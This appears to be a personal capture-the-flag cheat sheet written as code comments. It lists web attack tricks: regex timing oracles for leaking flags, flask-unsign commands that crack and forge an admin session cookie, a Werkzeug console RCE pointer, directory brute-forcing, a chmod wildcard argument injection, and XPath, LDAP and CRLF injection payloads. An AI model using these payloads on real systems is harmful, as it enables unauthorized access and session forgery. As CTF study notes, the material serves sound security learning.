// Random stuff
//! Exploits
//* regex injection
// "/(^uoftctf\\{f.*$)|(^u(.*?)*o(.*?)*f(.*?)*t(.*?)*c(.*?)*t(.*?)*f(.*?)*\\{(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*~$)/";
// if the flag starts with uoftctf{f if would take short time otherwise a long time
// ^(?=HTB{f)(((([a-zA-Z0-9{_])*)*)*)$
// if the flag starts with HTB{f if would take long time otherwise a short time
//* flusk cookies unsign
// flask-unsign --decode --cookie 'eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIFBsZWFzZSB0cnkgYWdhaW4uIl19XX0.aTC_CA.ZJ2lGWYijX-IXpcR36Ox2VeawL8'
// flask-unsign --unsign --cookie '.eJxFjEEKgDAMBL-ie-4L-gZ_IEVE01iILTTNSfp3exA8LTMw-2CLsutFCr8-mNoYqB0HqcJhKZzy9HE0mRF6cBgJw2cTcZDCTOeWMnyrRg61CMGDjbSNC1Oqeb9_1V8F6ies.aSMmOQ.XpsfjpEWKdpEJ7Sbv60Q90S8Xyo' --wordlist 'flask.txt'
// flask-unsign --sign --cookie "{'role' : 'admin'}" --secret theabyss
//* flask Console RCE
// go to /console
// https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html
//* directory enumeration
// gobuster -u ctf.nexus-security.club:3999 -w /home/sleepwell/ctf/Directories_All.txt  -t 30
// gobuster dir ctf.nexus-security.club:3999 -w /home/sleepwell/ctf/Directories_All.txt
//* YAML
// no can be interpreted as boolean value
//* chmod 000 *
// this is intepreted as chmod 000 * every file name
// so if there is a file with the name --reference=foo.txt
// and another file named foo.txt
// it will be executed as chmod 000 --reference=foo.txt foo.txt
// and that will make the chmod get the permitions from foo.txt instead of 000
//* get comands history
// ~/.bash_history
//* CRLF injection
// %0D%0A => new line
// %0D%0A%0D%0A => end of stream
//* XPath injection
//  query f"/military/district/staff[name='Groorg' and starts-with(selfDestructCode, 'H') or '1'='1']"
//  boolean(../../*[contains(., 'flag{')])
//* LDAP injection
// wild card *
// if () trigger and error its vulnarable
//* Current directory
// /proc/self/cwd
//* Php
// preg_match() will return false if there are more then 21750 matches in the regex
// php will throw an error if there are more than 1000 queries in the request
// json_decode in php decodes unicode sequences by default
//! usefull websites
//* hash cracker
// https://crackstation.net/
//* web hook
// https://app.beeceptor.com/console/iwillneverreapeat
//* proxy without security page
// ssh -R 80:localhost:4000 localhost.run
// ssh -R 80:localhost:8080 serveo.net
//* DNS rebinding
// https://lock.cmpxchg8b.com/rebinder.html
// http://1u.ms/
//* JavaScript Deobfuscator and Unpacker
// https://de4js.kshift.me/


